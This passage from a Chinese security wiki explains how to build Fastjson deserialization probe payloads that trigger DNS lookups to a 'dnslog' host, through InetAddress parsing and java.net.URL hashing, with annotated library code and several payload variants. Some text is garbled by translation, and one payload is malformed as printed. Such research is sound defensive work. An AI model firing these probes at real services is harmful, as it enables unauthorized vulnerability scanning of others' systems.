</code></pre></div>

<p>构造这个payload需要分两步，第一步我们需要让代码执行到1处，这一路解析器要接收的字符在代码已经标好。按照顺序写就是<code>{"@type":"java.net.InetSocketAddress"{"address":</code></p>
<div class="codehilite"><pre><span></span><code><span class="c1">//com.alibaba.fastjson.serializer.MiscCodec#deserialze</span>
<span class="nx">public</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">T</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">T</span><span class="w"> </span><span class="nx">deserialze</span><span class="p">(</span><span class="nx">DefaultJSONParser</span><span class="w"> </span><span class="nx">parser</span><span class="p">,</span><span class="w"> </span><span class="nx">Type</span><span class="w"> </span><span class="nx">clazz</span><span class="p">,</span><span class="w"> </span><span class="nx">Object</span><span class="w"> </span><span class="nx">fieldName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">JSONLexer</span><span class="w"> </span><span class="nx">lexer</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">parser</span><span class="p">.</span><span class="nx">lexer</span><span class="p">;</span>
<span class="w">        </span><span class="nx">String</span><span class="w"> </span><span class="nx">className</span><span class="p">;</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">InetSocketAddress</span><span class="p">.</span><span class="kd">class</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">lexer</span><span class="p">.</span><span class="nx">token</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">lexer</span><span class="p">.</span><span class="nx">nextToken</span><span class="p">();</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">null</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// 12 ---&gt; {</span>
<span class="w">                </span><span class="nx">parser</span><span class="p">.</span><span class="nx">accept</span><span class="p">(</span><span class="mi">12</span><span class="p">);</span>
<span class="w">                </span><span class="nx">InetAddress</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">null</span><span class="p">;</span>
<span class="w">                </span><span class="nx">int</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">                </span><span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">className</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">lexer</span><span class="p">.</span><span class="nx">stringVal</span><span class="p">();</span>

<span class="w">                    </span><span class="nx">lexer</span><span class="p">.</span><span class="nx">nextToken</span><span class="p">(</span><span class="mi">17</span><span class="p">);</span>
<span class="w">                    </span><span class="c1">// 字段名需要为address</span>
<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">className</span><span class="p">.</span><span class="nx">equals</span><span class="p">(</span><span class="s">&quot;address&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="c1">// 17 ---&gt; :</span>
<span class="w">                        </span><span class="nx">parser</span><span class="p">.</span><span class="nx">accept</span><span class="p">(</span><span class="mi">17</span><span class="p">);</span>
<span class="w">                        </span><span class="c1">// 1. 我们需要让解析器走到这里</span>
<span class="w">                        </span><span class="nx">address</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="nx">InetAddress</span><span class="p">)</span><span class="nx">parser</span><span class="p">.</span><span class="nx">parseObject</span><span class="p">(</span><span class="nx">InetAddress</span><span class="p">.</span><span class="kd">class</span><span class="p">);</span>
<span class="w">                    </span><span class="p">}</span><span class="w"> </span>
<span class="w">                    </span><span class="o">...</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span>
<span class="w">        </span><span class="o">...</span>
<span class="p">}</span>
</code></pre></div>

<p><code>parser.parseObject(InetAddress.class)</code>最终依然会，调用<code>MiscCodec#deserialze()</code>方法来序列化，这里就来到了我们构造payload的第二步。第二步的目标是要让解析器走到<code>InetAddress.getByName(strVal)</code>。解析器要接受的字符在代码里标好了，并按顺序写就是<code>,"val":"http://dnslog"}</code>。</p>
<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="n">com</span><span class="o">.</span><span class="n">alibaba</span><span class="o">.</span><span class="n">fastjson</span><span class="o">.</span><span class="n">serializer</span><span class="o">.</span><span class="n">MiscCodec</span><span class="c1">#deserialze</span>
<span class="n">public</span><span class="w"> </span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">deserialze</span><span class="p">(</span><span class="n">DefaultJSONParser</span><span class="w"> </span><span class="n">parser</span><span class="p">,</span><span class="w"> </span><span class="n">Type</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="w"> </span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">fieldName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">JSONLexer</span><span class="w"> </span><span class="n">lexer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parser</span><span class="o">.</span><span class="n">lexer</span><span class="p">;</span>
<span class="w">        </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">className</span><span class="p">;</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="err">序列化的是</span><span class="n">InetAddress</span><span class="o">.</span><span class="n">class类</span><span class="err">，走</span><span class="n">else流程</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">InetSocketAddress</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">...</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">objVal</span><span class="p">;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">parser</span><span class="o">.</span><span class="n">resolveStatus</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">parser</span><span class="o">.</span><span class="n">resolveStatus</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">                </span><span class="o">//</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="o">---&gt;</span><span class="w"> </span><span class="p">,</span>
<span class="w">                </span><span class="n">parser</span><span class="o">.</span><span class="n">accept</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">lexer</span><span class="o">.</span><span class="n">token</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="n">throw</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s2">&quot;syntax error&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="o">//</span><span class="w"> </span><span class="err">字段名</span><span class="w"> </span><span class="o">---&gt;</span><span class="w"> </span><span class="n">val</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="s2">&quot;val&quot;</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="n">lexer</span><span class="o">.</span><span class="n">stringVal</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="n">throw</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s2">&quot;syntax error&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>

<span class="w">                </span><span class="n">lexer</span><span class="o">.</span><span class="n">nextToken</span><span class="p">();</span>
<span class="w">                </span><span class="o">//</span><span class="w"> </span><span class="mi">17</span><span class="w"> </span><span class="o">---&gt;</span><span class="w"> </span><span class="p">:</span>
<span class="w">                </span><span class="n">parser</span><span class="o">.</span><span class="n">accept</span><span class="p">(</span><span class="mi">17</span><span class="p">);</span>
<span class="w">                </span><span class="o">//</span><span class="w"> </span><span class="err">之后解析为对象</span><span class="p">,</span><span class="err">也就是</span><span class="n">val字段对应的值</span>
<span class="w">                </span><span class="n">objVal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parser</span><span class="o">.</span><span class="n">parse</span><span class="p">();</span>
<span class="w">                </span><span class="o">//</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="o">---&gt;</span><span class="w"> </span><span class="p">}</span>
<span class="w">                </span><span class="n">parser</span><span class="o">.</span><span class="n">accept</span><span class="p">(</span><span class="mi">13</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span>
<span class="w">            </span><span class="o">....</span>
<span class="w">           </span><span class="o">//</span><span class="w"> </span><span class="err">后续的流程和方法一一样了，进行类型判断</span>
<span class="w">           </span><span class="n">strVal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nb nb-Type">String</span><span class="p">)</span><span class="n">objVal</span><span class="p">;</span>
<span class="w">           </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strVal</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">strVal</span><span class="o">.</span><span class="n">length</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">UUID</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="o">...</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">URI</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="o">...</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">URL</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="o">...</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">InetAddress</span><span class="o">.</span><span class="k">class</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">Inet4Address</span><span class="o">.</span><span class="k">class</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">Inet6Address</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="o">...</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="o">//</span><span class="w"> </span><span class="err">域名解析</span>
<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="n">InetAddress</span><span class="o">.</span><span class="n">getByName</span><span class="p">(</span><span class="n">strVal</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">UnknownHostException</span><span class="w"> </span><span class="n">var11</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="n">throw</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s2">&quot;deserialize inet adress error&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">var11</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span>
<span class="p">}</span>
</code></pre></div>

<p>两段合起来就得到了最终的有效载荷。</p>
<h2 id="javaneturl">方法三：利用java.net.URL<a class="headerlink" href="#javaneturl" title="Permanent link">&para;</a></h2>
<p><code>java.net.URL</code>类也在<code>IdentityHashMap</code>中，和上面一样无视<code>checkAutoType</code>检查。</p>
<div class="codehilite"><pre><span></span><code><span class="p">{{</span><span class="err">“</span><span class="w"> </span><span class="err">@</span><span class="k">type</span><span class="err">”：“</span><span class="w"> </span><span class="nx">java</span><span class="p">.</span><span class="nx">net</span><span class="p">.</span><span class="nx">URL</span><span class="err">”，“</span><span class="w"> </span><span class="nx">val</span><span class="err">”：“</span><span class="w"> </span><span class="nx">http</span><span class="err">：</span><span class="c1">// dnslog”}：“ x”}</span>
</code></pre></div>

<p>来源于<code>@retanoj</code>状语从句：<code>@threedr3am</code>两位师傅的启发，其原理和ysoserial的中<code>URLDNS</code>这个小工具的原理一样。</p>
<p><strong>简单来说就是向HashMap压入一个键值对时，HashMap需要获取键对象的哈希码。当键对象是一个URL对象时，在获取它的</strong><code>hashcode</code><strong>期间会调用</strong><code>getHostAddress</code><strong>方法获取主机，这个过程域名会被解析。</strong></p>
<p>2 1.png</p>
<p>URL对象hashcode的获取过程</p>
<p>fastjson解析上述payload时，先反序列化出<code>URL(http://dnslog)</code>对象，然后将<code>{URL(http://dnslog):"x"}</code>解析为一个HashMap，域名被解析。</p>
<p><code>@retanoj</code>在<a href="https://github.com/alibaba/fastjson/issues/3077">问题</a>中还构造了好几个畸形的有效载荷，虽然原理都是一样的，但还是挺有意思的，意识到了师傅对fastjson词法分析器透彻的理解。</p>
<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;java.net.URL&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;val&quot;</span><span class="p">:</span><span class="s">&quot;http://dnslog&quot;</span><span class="p">}}</span><span class="s">&quot;&quot;</span><span class="p">}</span>
<span class="nx">Set</span><span class="p">[{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;java.net.URL&quot;</span><span class="p">,</span><span class="s">&quot;val&quot;</span><span class="p">:</span><span class="s">&quot;http://dnslog&quot;</span><span class="p">}]</span>
<span class="nx">Set</span><span class="p">[{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;java.net.URL&quot;</span><span class="p">,</span><span class="s">&quot;val&quot;</span><span class="p">:</span><span class="s">&quot;http://dnslog&quot;</span><span class="p">}</span>
<span class="p">{{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;java.net.URL&quot;</span><span class="p">,</span><span class="s">&quot;val&quot;</span><span class="p">:</span><span class="s">&quot;http://dnslog&quot;</span><span class="p">}:</span><span class="mi">0</span>
</code></pre></div>

<h2 id="_1">参考链接<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://www.adminxe.com/1037.html">https://www.adminxe.com/1037.html</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../1.2.24-rce/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../1.2.24-rce/" class="btn btn-xs btn-link">
        Fastjson 1.2.24 Deserialization Remote Command Execution (CVE-2017-18349)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Fastjson%20%E5%A4%9A%E7%89%88%E6%9C%ACpayload%E9%9B%86%E5%90%88/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Fastjson%20%E5%A4%9A%E7%89%88%E6%9C%ACpayload%E9%9B%86%E5%90%88/" class="btn btn-xs btn-link">
        Fastjson 多版本payload集合
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>